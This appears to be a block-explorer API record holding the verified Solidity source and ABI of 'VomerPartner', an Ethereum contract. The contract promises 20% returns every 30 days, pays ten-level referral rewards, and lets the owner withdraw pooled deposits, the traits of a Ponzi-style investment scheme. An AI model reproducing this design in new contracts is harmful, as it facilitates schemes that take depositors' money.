{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.16;\r\n\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n        // benefit is lost if 'b' is also tested.\r\n        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0, \"SafeMath: modulo by zero\");\r\n        return a % b;\r\n    }\r\n}\r\n\r\ncontract ERC20 {\r\n    uint public decimals;\r\n    function allowance(address, address) public view returns (uint);\r\n    function balanceOf(address) public view returns (uint);\r\n    function approve(address, uint) public;\r\n    function transfer(address, uint) public returns (bool);\r\n    function transferFrom(address, address, uint) public returns (bool);\r\n}\r\n\r\n/**\r\n * @dev Collection of functions related to the address type,\r\n */\r\nlibrary Address {\r\n    /**\r\n     * @dev Returns true if `account` is a contract.\r\n     *\r\n     * This test is non-exhaustive, and there may be false-negatives: during the\r\n     * execution of a contract's constructor, its address will be reported as\r\n     * not containing a contract.\r\n     *\r\n     * > It is unsafe to assume that an address for which this function returns\r\n     * false is an externally-owned account (EOA) and not a contract.\r\n     */\r\n    function isContract(address account) internal view returns (bool) {\r\n        // This method relies in extcodesize, which returns 0 for contracts in\r\n        // construction, since the code is only stored at the end of the\r\n        // constructor execution.\r\n\r\n        uint256 size;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { size := extcodesize(account) }\r\n        return size > 0;\r\n    }\r\n}\r\n\r\n/**\r\n * @title SafeERC20\r\n * @dev Wrappers around ERC20 operations that throw on failure (when the token\r\n * contract returns false). Tokens that return no value (and instead revert or\r\n * throw on failure) are also supported, non-reverting calls are assumed to be\r\n * successful.\r\n * To use this library you can add a `using SafeERC20 for ERC20;` statement to your contract,\r\n * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.\r\n */\r\nlibrary SafeERC20 {\r\n    \r\n    using SafeMath for uint256;\r\n    using Address for address;\r\n\r\n    function safeTransfer(ERC20 token, address to, uint256 value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n    }\r\n\r\n    function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n    }\r\n\r\n    function safeApprove(ERC20 token, address spender, uint256 value) internal {\r\n        // safeApprove should only be called when setting an initial allowance,\r\n        // or when resetting it to zero. To increase and decrease it, use\r\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\r\n        // solhint-disable-next-line max-line-length\r\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n\r\n    function safeIncreaseAllowance(ERC20 token, address spender, uint256 value) internal {\r\n        uint256 newAllowance = token.allowance(address(this), spender).add(value);\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\r\n    }\r\n\r\n    function safeDecreaseAllowance(ERC20 token, address spender, uint256 value) internal {\r\n        uint256 newAllowance = token.allowance(address(this), spender).sub(value);\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));\r\n    }\r\n\r\n    /**\r\n     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement\r\n     * on the return value: the return value is optional (but if data is returned, it must not be false).\r\n     * @param token The token targeted by the call.\r\n     * @param data The call data (encoded using abi.encode or one of its variants).\r\n     */\r\n    function callOptionalReturn(ERC20 token, bytes memory data) private {\r\n        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since\r\n        // we're implementing it ourselves.\r\n\r\n        // A Solidity high level call has three parts:\r\n        //  1. The target address is checked to verify it contains contract code\r\n        //  2. The call itself is made, and success asserted\r\n        //  3. The return value is decoded, which in turn checks the size of the returned data.\r\n        // solhint-disable-next-line max-line-length\r\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n        require(success, \"SafeERC20: low-level call failed\");\r\n\r\n        if (returndata.length > 0) { // Return data is optional\r\n            // solhint-disable-next-line max-line-length\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}\r\n\r\nlibrary UniversalERC20 {\r\n\r\n    using SafeMath for uint256;\r\n    using SafeERC20 for ERC20;\r\n\r\n    ERC20 private constant ZERO_ADDRESS = ERC20(0x0000000000000000000000000000000000000000);\r\n    ERC20 private constant ETH_ADDRESS = ERC20(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);\r\n\r\n    function universalTransfer(ERC20 token, address to, uint256 amount) internal {\r\n        universalTransfer(token, to, amount, false);\r\n    }\r\n\r\n    function universalTransfer(ERC20 token, address to, uint256 amount, bool mayFail) internal returns(bool) {\r\n        if (amount == 0) {\r\n            return true;\r\n        }\r\n\r\n        if (token == ZERO_ADDRESS || token == ETH_ADDRESS) {\r\n            if (mayFail) {\r\n                return address(uint160(to)).send(amount);\r\n            } else {\r\n                address(uint160(to)).transfer(amount);\r\n                return true;\r\n            }\r\n        } else {\r\n            token.safeTransfer(to, amount);\r\n            return true;\r\n        }\r\n    }\r\n\r\n    function universalApprove(ERC20 token, address to, uint256 amount) internal {\r\n        if (token != ZERO_ADDRESS && token != ETH_ADDRESS) {\r\n            token.safeApprove(to, amount);\r\n        }\r\n    }\r\n\r\n    function universalTransferFrom(ERC20 token, address from, address to, uint256 amount) internal {\r\n        if (amount == 0) {\r\n            return;\r\n        }\r\n\r\n        if (token == ZERO_ADDRESS || token == ETH_ADDRESS) {\r\n            require(from == msg.sender && msg.value >= amount, \"msg.value is zero\");\r\n            if (to != address(this)) {\r\n                address(uint160(to)).transfer(amount);\r\n            }\r\n            if (msg.value > amount) {\r\n                msg.sender.transfer(uint256(msg.value).sub(amount));\r\n            }\r\n        } else {\r\n            token.safeTransferFrom(from, to, amount);\r\n        }\r\n    }\r\n\r\n    function universalBalanceOf(ERC20 token, address who) internal view returns (uint256) {\r\n        if (token == ZERO_ADDRESS || token == ETH_ADDRESS) {\r\n            return who.balance;\r\n        } else {\r\n            return token.balanceOf(who);\r\n        }\r\n    }\r\n}\r\n\r\ncontract ERC20Token\r\n{\r\n    mapping (address => uint256) public balanceOf;\r\n    function transfer(address _to, uint256 _value) public;\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\r\n}\r\n\r\ncontract ShareholderVomer \r\n{\r\n    function takeEth(address targetAddr, uint256 amount) public;\r\n    function giveBackEth() payable public;\r\n}\r\n    \r\ncontract VomerPartner\r\n{\r\n    using SafeMath for uint256;\r\n\r\n    address payable public owner;\r\n    address payable public newOwnerCandidate;\r\n\r\n    uint256 MinBalanceVMR;\r\n    ERC20Token VMR_Token;\r\n    \r\n    ShareholderVomer partnerContract;\r\n    address payable supportAddress;\r\n\r\n    struct InvestorData {\r\n        uint256 funds;\r\n        uint256 lastDatetime;\r\n        uint256 totalProfit;\r\n        uint256 totalVMR;\r\n        uint256 pendingReward;\r\n        // Partner info\r\n        uint256 totalReferralProfit;\r\n        uint256 pendingReferralReward;\r\n    }\r\n    mapping (address => InvestorData) investors;\r\n    \r\n    mapping(address => address) refList;\r\n\r\n    mapping(address => bool) public admins;\r\n\r\n    modifier onlyOwner()\r\n    {\r\n        assert(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    modifier onlyAdminOrOwner()\r\n    {\r\n        require(admins[msg.sender] || msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    event Reward(address indexed userAddress, uint256 amount);\r\n    event ReferralReward(address indexed userAddress, uint256 amount);\r\n    \r\n    constructor() public {\r\n        VMR_Token = ERC20Token(0x063b98a414EAA1D4a5D4fC235a22db1427199024); \r\n        partnerContract = ShareholderVomer(0xE1f5c6FD86628E299955a84f44E2DFCA47aAaaa4);\r\n        MinBalanceVMR = 100 * 10**18;\r\n        supportAddress = 0x4B7b1878338251874Ad8Dace56D198e31278676d;\r\n        newOwnerCandidate = 0x4B7b1878338251874Ad8Dace56D198e31278676d;\r\n        owner = msg.sender;\r\n        admins[0x6Ecb917AfD0611F8Ab161f992a12c82e29dc533c] = true;\r\n    }\r\n\r\n    function changeSupportAddress(address newSupportAddress) onlyOwner public \r\n    {\r\n        require(newSupportAddress != address(0));\r\n        supportAddress = address(uint160(newSupportAddress));\r\n    }\r\n    \r\n    function safeEthTransfer(address target, uint256 amount) internal {\r\n        address payable payableTarget = address(uint160(target));\r\n        (bool ok, ) = payableTarget.call.value(amount)(\"\");\r\n        require(ok, \"can't send eth to address\");\r\n    }\r\n\r\n    function setAdmin(address newAdmin, bool activate) onlyOwner public {\r\n        admins[newAdmin] = activate;\r\n    }\r\n\r\n    uint256 public fundsLockedtoWithdraw;\r\n    uint256 public dateUntilFundsLocked;\r\n\r\n    function withdraw(uint256 amount)  public onlyOwner {\r\n        if (dateUntilFundsLocked > now) require(address(this).balance.sub(amount) > fundsLockedtoWithdraw);\r\n        owner.transfer(amount);\r\n    }\r\n\r\n    function lockFunds(uint256 amount) public onlyOwner {\r\n        // funds lock is active\r\n        if (dateUntilFundsLocked > now) {\r\n            require(amount > fundsLockedtoWithdraw);\r\n        }\r\n        fundsLockedtoWithdraw = amount;\r\n        dateUntilFundsLocked = now + 30 days;\r\n    }\r\n\r\n    function changeOwnerCandidate(address payable newOwner) public onlyOwner {\r\n        newOwnerCandidate = newOwner;\r\n    }\r\n\r\n    function acceptOwner() public {\r\n        require(msg.sender == newOwnerCandidate);\r\n        owner = newOwnerCandidate;\r\n    }\r\n\r\n    function changeMinBalance(uint256 newMinBalance) public onlyOwner {\r\n        MinBalanceVMR = newMinBalance * 10**18;\r\n    }\r\n\r\n    function bytesToAddress(bytes memory bys) private pure returns (address payable addr) {\r\n        assembly {\r\n            addr := mload(add(bys,20))\r\n        }\r\n    }\r\n    // function for transfer any token from contract\r\n    function transferTokens (address token, address target, uint256 amount) onlyOwner public\r\n    {\r\n        ERC20Token(token).transfer(target, amount);\r\n    }\r\n\r\n    function getInfo(address investor) view public returns (uint256 totalFunds, uint256 pendingReward, uint256 totalProfit, uint256 contractBalance, uint256 totalVMR, uint256 minVMR, uint256 totalReferralProfit, uint256 pendingReferralReward)\r\n    {\r\n        contractBalance = address(this).balance;\r\n        minVMR = MinBalanceVMR;\r\n        InvestorData memory data = investors[investor];\r\n        totalFunds = data.funds;\r\n        if (data.funds > 0) {\r\n            pendingReward = data.pendingReward + data.funds.mul(20).div(100).mul(block.timestamp - data.lastDatetime).div(30 days);\r\n            pendingReward = pendingReward * 85 / 100; // -15% to ref payments\r\n        }\r\n        totalProfit = data.totalProfit;\r\n        totalVMR = data.totalVMR;\r\n        \r\n        // Referral\\partner data\r\n        totalReferralProfit = data.totalReferralProfit;\r\n        pendingReferralReward = data.pendingReferralReward;\r\n    }\r\n\r\n    function getLevelReward(uint8 level) pure internal returns(uint256 rewardLevel) {\r\n        if (level == 0) \r\n            return 5; \r\n        else if (level == 1)\r\n            return 2; \r\n        else             \r\n            return 1;\r\n    }\r\n    \r\n    function setDepositTokens(address[] calldata userAddress, uint256[] calldata amountTokens) onlyAdminOrOwner external {\r\n        uint256 len = userAddress.length;\r\n        require(len == amountTokens.length);\r\n\r\n        for(uint16 i = 0;i < len; i++) {\r\n            investors[userAddress[i]].totalVMR = amountTokens[i];\r\n        }\r\n    }\r\n    \r\n    function getRefByUser(address addr) view public returns (address) {\r\n        return refList[addr];\r\n    }\r\n    \r\n    function withdrawReward(InvestorData storage data) internal {\r\n        uint256 reward;\r\n        \r\n        require(data.totalVMR >= MinBalanceVMR, \"Not enough VMR\");\r\n        \r\n        require(data.funds > 0);\r\n        \r\n        // 20% per 30 days\r\n        reward = data.pendingReward + data.funds.mul(20).div(100).mul(block.timestamp - data.lastDatetime).div(30 days);\r\n        data.pendingReward = 0;\r\n        data.lastDatetime = block.timestamp;\r\n\r\n        uint256 maxRewardReferal = reward * 15 / 100; // 15% to ref\r\n        reward = reward * 85 / 100;                   // 85% to user\r\n        uint256 restReferralFunds = maxRewardReferal;\r\n        \r\n        address ref = refList[msg.sender];\r\n        require(ref != address(0));\r\n        \r\n        for(uint8 i = 0; i < 10;i++) {\r\n            uint256 rewardForRef = maxRewardReferal * getLevelReward(i) / 100;\r\n            restReferralFunds = restReferralFunds.sub(rewardForRef);\r\n\r\n            investors[ref].pendingReferralReward += rewardForRef;\r\n            \r\n            ref = refList[ref];\r\n            if (ref == address(0)) break;\r\n        }\r\n        \r\n        if (restReferralFunds > 0) {\r\n            partnerContract.takeEth(supportAddress, restReferralFunds);\r\n        }\r\n                    \r\n        data.totalProfit = data.totalProfit.add(reward);\r\n        data.totalReferralProfit = data.totalReferralProfit.add(data.pendingReferralReward);\r\n        \r\n        uint256 _pendingReferralReward = data.pendingReferralReward;\r\n        data.pendingReferralReward = 0;\r\n        \r\n        address payable payableUser = address(uint160(msg.sender));\r\n        \r\n        if (reward > 0) {\r\n            partnerContract.takeEth(payableUser, reward);\r\n            emit Reward(payableUser, reward);\r\n        }\r\n        \r\n        if (_pendingReferralReward > 0) {\r\n            partnerContract.takeEth(payableUser, _pendingReferralReward);\r\n            emit ReferralReward(payableUser, _pendingReferralReward);\r\n        }\r\n    }\r\n    \r\n    function () payable external\r\n    {\r\n        if (msg.sender == address(partnerContract)) return;\r\n        \r\n        require(msg.sender == tx.origin); // prevent bots to interact with contract\r\n\r\n        if (msg.sender == owner) return;\r\n\r\n        InvestorData storage data = investors[msg.sender];\r\n        \r\n        if (msg.value == 0) {\r\n            withdrawReward(data);\r\n            return;\r\n        }\r\n        \r\n        require(msg.value >= 0.1 ether);\r\n        \r\n        address ref;\r\n        if (refList[msg.sender] != address(0))\r\n        {\r\n            ref = refList[msg.sender];\r\n        } else {\r\n            require(msg.data.length == 20, \"first interaction with contract should be with referral address\");\r\n            ref = bytesToAddress(msg.data);\r\n            require(ref != msg.sender, \"You can't ref yourself\");\r\n        \r\n            refList[msg.sender] = ref;\r\n        }\r\n        \r\n        supportAddress.transfer(msg.value.mul(5).div(100));  // 5%\r\n        \r\n        if (data.funds > 0) data.pendingReward += data.funds.mul(20).div(100).mul(block.timestamp - data.lastDatetime).div(30 days);\r\n        data.lastDatetime = block.timestamp;\r\n        data.funds = data.funds.add(msg.value * 95 / 100); // 95%\r\n        \r\n        partnerContract.giveBackEth.value(address(this).balance)();\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"ReferralReward\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Reward\",\"type\":\"event\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":false,\"inputs\":[],\"name\":\"acceptOwner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"admins\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newMinBalance\",\"type\":\"uint256\"}],\"name\":\"changeMinBalance\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"changeOwnerCandidate\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"newSupportAddress\",\"type\":\"address\"}],\"name\":\"changeSupportAddress\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"dateUntilFundsLocked\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"fundsLockedtoWithdraw\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"investor\",\"type\":\"address\"}],\"name\":\"getInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"totalFunds\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"pendingReward\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalProfit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"contractBalance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalVMR\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"minVMR\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalReferralProfit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"pendingReferralReward\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"getRefByUser\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"lockFunds\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"newOwnerCandidate\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"newAdmin\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"activate\",\"type\":\"bool\"}],\"name\":\"setAdmin\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"userAddress\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amountTokens\",\"type\":\"uint256[]\"}],\"name\":\"setDepositTokens\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferTokens\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"VomerPartner","CompilerVersion":"v0.5.17+commit.d19bba13","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://35d388dddab538fa955c4829e028270c3a882eb8ba872e72cce3427d654d319d"}]}